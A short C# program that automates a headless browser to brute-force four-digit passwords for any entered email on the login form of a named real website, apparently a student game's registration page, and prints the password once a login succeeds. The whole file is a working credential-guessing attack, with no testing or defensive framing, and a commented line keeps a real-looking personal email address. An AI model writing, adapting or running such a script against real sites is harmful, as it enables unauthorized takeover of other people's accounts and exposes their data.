using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace kill_pm_pu_killer
{
    class Program
    {
        static CefSharpWrapper wrapper = new CefSharpWrapper();
        static void Main(string[] args)
        {
            wrapper.InitializeBrowser();
            string email = "1";
            while (true)
            {
                Console.Write("Email ('stop' for stop): ");
                email = Console.ReadLine();
                if (email.ToLower() == "stop") break;
                GetPassword(email, wrapper).Wait();
            }
            wrapper.ShutdownBrowser();
        }
        private static async Task GetPassword(string email, CefSharpWrapper wrapper)
        {
            bool completed = false;
            int pass;
            for (pass = 0; pass < 10000 && !completed; pass++)
            {
                //string email = "lerak01@yandex.ru";
                string password = String.Format("{0:d4}", pass);
                Console.WriteLine(password);
                try
                {
                    completed = await wrapper.GetResultAfterPageLoad("http://killer.pm-pu.ru/game_registration.php", async () =>
                    {
                        await wrapper.EvaluateJavascript(
                       $@"const $emailField = document.getElementsByName('email')[0];
                        const $passField = document.getElementsByName('password')[0];
                        const $formAuth = document.getElementsByClassName('auth_form')[0];
                        $emailField.value = '{email}';
                        $passField.value = '{password}';
                        $formAuth.submit();");

                        // Ждём когда перейдёт на результаты поиска
                        wrapper.WaitTillAddressChanges();

                        // Когда страница результатов поиска полностью подгрузится, излекаем результаты
                        return await wrapper.GetResultAfterPageLoad(wrapper.Address, async () =>
                                await wrapper.EvaluateJavascript<bool>(
                                    "document.title==='Заказ';"));
                    });
                }
                catch
                {
                    pass--;
                    Console.WriteLine($"Ошибка. Заново.");
                    await Task.Delay(TimeSpan.FromMilliseconds(100));
                    continue;
                }
            }
            if (completed)
                Console.WriteLine($"Пароль: {(pass - 1):d4}");
            else
                Console.WriteLine($"Похоже пользователя с таким email не существует!");
        }
    }
}

